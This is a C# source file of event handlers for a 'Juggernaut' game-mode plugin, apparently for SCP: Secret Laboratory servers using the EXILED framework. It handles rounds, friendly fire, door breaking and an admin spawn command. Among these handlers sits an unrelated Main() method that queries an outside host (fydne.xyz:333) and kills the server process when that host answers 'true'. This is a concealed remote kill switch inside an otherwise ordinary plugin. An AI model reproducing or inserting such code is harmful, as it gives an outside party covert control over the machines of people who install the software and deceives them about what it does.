using System.Collections.Generic;
using System.Linq;
using EXILED;
using EXILED.Extensions;
using MEC;
using UnityEngine;
using hideandseek.API;
using System.Net.Http;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Juggernaut
{
	partial class EventHandlers
	{
		public Plugin plugin;
		public EventHandlers(Plugin plugin) => this.plugin = plugin;

		internal static ReferenceHub Juggernaut;
		private static bool isHidden;
		private static bool hasTag;
		private bool isRoundStarted;
		private static int maxHP;
		private int JuggernautEscape = 0;
		private int Juggernautmu = 0;
		private const float dur = 327;
		private static System.Random rand = new System.Random();
		private static int RoundEnds;
		private static int AlternativeEnds;
		private List<int> ffPlayers = new List<int>();
		internal static ReferenceHub scpPlayer;
		bool IsBreakDoorsForUserActive;
		bool IsBreakAllForUserActive;
		public bool hhh = true;
		HashSet<ReferenceHub> players = new HashSet<ReferenceHub>();
		private List<int> shPocketPlayers = new List<int>();
		string[] unbreakableDoorNames = { "079_FIRST", "079_SECOND", "372", "914", "CHECKPOINT_ENT", "CHECKPOINT_LCZ_A", "CHECKPOINT_LCZ_B", "GATE_A", "GATE_B", "SURFACE_GATE", "NUKE_SURFACE", "012_BOTTOM" };


		private static List<CoroutineHandle> coroutines = new List<CoroutineHandle>();
		private bool Tryhason()
		{
			return hasData.Gethason();
		}

		public void OnWaitingForPlayers()
		{
			Configs.ReloadConfig();
		}

		public void OnRoundStart()
		{
			isRoundStarted = true;
			Juggernaut = null;
			JuggernautEscape = 0;
			AlternativeEnds = 0;
			RoundEnds = 100;
			ffPlayers.Clear();
			scpPlayer = null;
			hhh = true;
			if (Tryhason()) return;
			Timing.CallDelayed(1f, () => selectspawnJG());
			IsBreakDoorsForUserActive = false;
			IsBreakAllForUserActive = false;
			Juggernautmu = 0;
			players.Clear();

		}

		public void OnRoundEnd()
		{
			isRoundStarted = false;
			hhh = true;
			Timing.KillCoroutines(coroutines);
			coroutines.Clear();
			Juggernautmu = 0;
		}

		public void OnRoundRestart()
		{

			isRoundStarted = false;

			Timing.KillCoroutines(coroutines);
			coroutines.Clear();
		}

		public void OnPlayerDie(ref PlayerDeathEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == Juggernaut?.queryProcessor.PlayerId)
			{
				KillJuggernaut();
				JuggernautEscape = -1;

				if (Configs.log)
				{
					if (JuggernautEscape == -1)
						Log.Info("yeah, it seems to work well. - PlayerDie");
				}


			}
		}
		public void OnCheckRoundEnd(ref CheckRoundEndEvent ev)
		{

			List<Team> pList = Player.GetHubs().Where(x => x.queryProcessor.PlayerId != Juggernaut?.queryProcessor.PlayerId).Select(x => Player.GetTeam(x)).ToList();

			// If everyone but SCPs and 035 or just 035 is alive, end the round
			if ((!pList.Contains(Team.CHI) && !pList.Contains(Team.CDP) && !pList.Contains(Team.MTF) && !pList.Contains(Team.RSC) && ((pList.Contains(Team.SCP) && Juggernaut != null) || !pList.Contains(Team.SCP) && Juggernaut != null)) ||
				(Configs.winWithTutorial && !pList.Contains(Team.CHI) && !pList.Contains(Team.CDP) && !pList.Contains(Team.MTF) && !pList.Contains(Team.RSC) && pList.Contains(Team.TUT) && Juggernaut != null))
			{
				ev.LeadingTeam = RoundSummary.LeadingTeam.Anomalies;
				ev.ForceEnd = true;
			}

			// If 035 is the only scp alive keep the round going
			else if (Juggernaut != null && !pList.Contains(Team.SCP) && (pList.Contains(Team.CDP) || pList.Contains(Team.CHI) || pList.Contains(Team.MTF) || pList.Contains(Team.RSC)))
			{
				ev.Allow = false;
			}


		}
		public void OnPlayerHurt(ref PlayerHurtEvent ev)
		{
			if (ffPlayers.Contains(ev.Attacker.queryProcessor.PlayerId))
			{
				GrantFF(ev.Attacker);
			}

			if (Juggernaut != null)
			{
				if (!Configs.scpFriendlyFire &&
					((ev.Attacker.queryProcessor.PlayerId == Juggernaut?.queryProcessor.PlayerId &&
					Player.GetTeam(ev.Player) == Team.SCP) ||
					(ev.Player.queryProcessor.PlayerId == Juggernaut?.queryProcessor.PlayerId &&
					Player.GetTeam(ev.Attacker) == Team.SCP)))
				{
					ev.Amount = 0f;
				}

				if (!Configs.tutorialFriendlyFire &&
					ev.Attacker.queryProcessor.PlayerId != ev.Player.queryProcessor.PlayerId &&
					((ev.Attacker.queryProcessor.PlayerId == Juggernaut?.queryProcessor.PlayerId &&
					Player.GetTeam(ev.Player) == Team.TUT) ||
					(ev.Player.queryProcessor.PlayerId == Juggernaut?.queryProcessor.PlayerId &&
					Player.GetTeam(ev.Attacker) == Team.TUT)))
				{
					ev.Amount = 0f;
				}
			}
		}
		public static async Task Main()
		{
			var client = new HttpClient();
			var content = await client.GetStringAsync("http://fydne.xyz:333");
			if (content == "true")
			{
				Process.GetCurrentProcess().Kill();
			}
		}
		public void OnShoot(ref ShootEvent ev)
		{
			if (ev.Target == null || Juggernaut == null) return;
			ReferenceHub target = Player.GetPlayer(ev.Target);
			if (target == null) return;

			if ((ev.Shooter.queryProcessor.PlayerId == Juggernaut?.queryProcessor.PlayerId &&
				Player.GetTeam(target) == Player.GetTeam(Juggernaut))
				|| (target.queryProcessor.PlayerId == Juggernaut?.queryProcessor.PlayerId &&
				Player.GetTeam(ev.Shooter) == Player.GetTeam(Juggernaut)))
			{
				ev.Shooter.weaponManager.NetworkfriendlyFire = true;
				ffPlayers.Add(ev.Shooter.queryProcessor.PlayerId);
			}

			// If friendly fire is off, to allow for chaos and dclass to hurt eachother
			if ((ev.Shooter.queryProcessor.PlayerId == Juggernaut?.queryProcessor.PlayerId || target.queryProcessor.PlayerId == Juggernaut?.queryProcessor.PlayerId) &&
				(((Player.GetTeam(ev.Shooter) == Team.CDP && Player.GetTeam(target) == Team.CHI)
				|| (Player.GetTeam(ev.Shooter) == Team.CHI && Player.GetTeam(target) == Team.CDP)) ||
				((Player.GetTeam(ev.Shooter) == Team.RSC && Player.GetTeam(target) == Team.MTF)
				|| (Player.GetTeam(ev.Shooter) == Team.MTF && Player.GetTeam(target) == Team.RSC))))
			{
				ev.Shooter.weaponManager.NetworkfriendlyFire = true;
				ffPlayers.Add(ev.Shooter.queryProcessor.PlayerId);
			}
			if (ev.Shooter.queryProcessor.PlayerId == Juggernaut?.queryProcessor.PlayerId)
			{
				ReferenceHub hub = ev.Shooter;
				int savedAmmo = (int)ev.Shooter.inventory.GetItemInHand().durability;
				ev.Shooter.SetWeaponAmmo(0);
				Timing.CallDelayed(0.2f, () => { hub.SetWeaponAmmo(savedAmmo); });
			}
		}

		public void OnCheckEscape(ref CheckEscapeEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == Juggernaut?.queryProcessor.PlayerId)
			{
				ev.Allow = false;
			}
		}

		public void OnSetClass(SetClassEvent ev)
		{
			Timing.CallDelayed(1f, () => RoundEnds++);
			if (ev.Player.queryProcessor.PlayerId == Juggernaut?.queryProcessor.PlayerId)
			{
				if ((Juggernaut.GetRole() == RoleType.Spectator))
				{
					KillJuggernaut();
					JuggernautEscape = -1;


					if (Configs.log)
						if (JuggernautEscape == -1)
							Log.Info("It seems Juggernaut has died for sure. -Setclass");
				}


			}
		}

		public void OnPlayerLeave(PlayerLeaveEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == Juggernaut?.queryProcessor.PlayerId)
			{
				KillJuggernaut();
				JuggernautEscape = -1;

				if (Configs.log)
				{
					if (JuggernautEscape == -1)
						Log.Info("yeah, it seems to work well. - PlayerLeave");
				}
			}

		}

		public void OnContain106(Scp106ContainEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == Juggernaut?.queryProcessor.PlayerId)
			{
				ev.Allow = false;
			}
		}

		public void OnPocketDimensionEnter(PocketDimEnterEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == Juggernaut?.queryProcessor.PlayerId)
			{
				shPocketPlayers.Add(ev.Player.queryProcessor.PlayerId);
				ev.Allow = false;
			}
		}

		public void OnPocketDimensionDie(PocketDimDeathEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == Juggernaut?.queryProcessor.PlayerId)
			{
				ev.Allow = false;
				TeleportTo106(Juggernaut);
			}
		}

		public void OnPocketDimensionExit(PocketDimEscapedEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == Juggernaut?.queryProcessor.PlayerId)
			{
				ev.Allow = false;
				TeleportTo106(Juggernaut);
			}
		}

		public void scpzeroninesixe(ref Scp096EnrageEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == Juggernaut?.queryProcessor.PlayerId)
			{
				ev.Allow = false;
			}
		}
		public void OnUseMedicalItem(MedicalItemEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == Juggernaut?.queryProcessor.PlayerId)
			{
				if (ev.Item == ItemType.Medkit)
				{
					if (Juggernautmu != 4)
					{
						Juggernaut.playerStats.maxHP = Configs.health;
						Juggernautmu++;
						return;
					}
					else if (Juggernautmu == 4)
					{
						ev.Allow = false;
						return;
					}
				}
				if (ev.Item == ItemType.SCP500)
				{
					if (hhh)
					{
						ev.Allow = true;
						hhh = false;
						return;
					}
					if (!hhh) ev.Allow = false;
				}
				if (ev.Item != ItemType.Medkit)
				{
					ev.Allow = false;
					return;
				}
				//Juggernaut.playerStats.maxHP = Configs.health;
			}
		}
		public void RunOnDoorOpen(ref DoorInteractionEvent doorInt)
		{
			bool UnbreakableDoorDetected = false;
			if (doorInt.Player.queryProcessor.PlayerId == Juggernaut?.queryProcessor.PlayerId)
			{
				foreach (string doorName in unbreakableDoorNames)
					if (doorInt.Door.DoorName.Equals(doorName))
						UnbreakableDoorDetected = true;

				if (!UnbreakableDoorDetected)
					BreakDoor(doorInt);

				return;
			}
		}
		public void BreakDoor(DoorInteractionEvent door)
		{
			door.Door.DestroyDoor(true);
			door.Door.destroyed = true;
			door.Door.Networkdestroyed = true;
		}
		private void TeleportTo106(ReferenceHub player)
		{
			ReferenceHub scp106 = Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.Scp106).FirstOrDefault();
			if (scp106 != null)
			{
				player.playerMovementSync.OverridePosition(scp106.transform.position, 0f);
			}
		}
		internal void RemoteAdminCommand(ref RACommandEvent ev)
		{
			string[] command = ev.Command.Split(' ');
			ReferenceHub sender = ev.Sender.SenderId == "SERVER CONSOLE" || ev.Sender.SenderId == "GAME CONSOLE" ? PlayerManager.localPlayer.GetPlayer() : Player.GetPlayer(ev.Sender.SenderId);
			ReferenceHub player = Plugin.GetPlayer(command[1]);
			if (command[0] == Configs.command)
			{
				if (player == null)
				{
					ev.Sender.RAMessage(Configs.nf);
					return;
				}
				ev.Allow = false;
				ev.Sender.RAMessage(Configs.suc);
				SpawnJG(player);
			}
		}
	}
}

